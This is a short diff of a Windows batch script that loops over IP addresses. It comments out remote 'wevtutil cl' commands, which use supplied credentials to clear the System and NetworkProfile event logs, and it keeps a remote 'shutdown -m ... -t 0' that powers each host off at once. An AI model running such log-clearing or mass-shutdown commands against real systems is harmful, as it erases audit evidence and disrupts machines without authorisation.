@@ -9,8 +9,8 @@ set IPs=%IPs:~1%
 set IPs=%IPs:~0,-1%
 
 for %%i in (%IPs%) do (
-  wevtutil cl "Microsoft-Windows-NetworkProfile/Operational" /r /u %%i\%USERNAME% /p %PASSWORD:*%=%% /s %%i
-  wevtutil cl "System" /r /u %%i\%USERNAME% /p %PASSWORD:*%=%% /s %%i
+  REM wevtutil cl "Microsoft-Windows-NetworkProfile/Operational" /r /u %%i\%USERNAME% /p %PASSWORD:*%=%% /s %%i
+  REM wevtutil cl "System" /r /u %%i\%USERNAME% /p %PASSWORD:*%=%% /s %%i
   shutdown -i -s -m \\%%i -t 0
 )
 
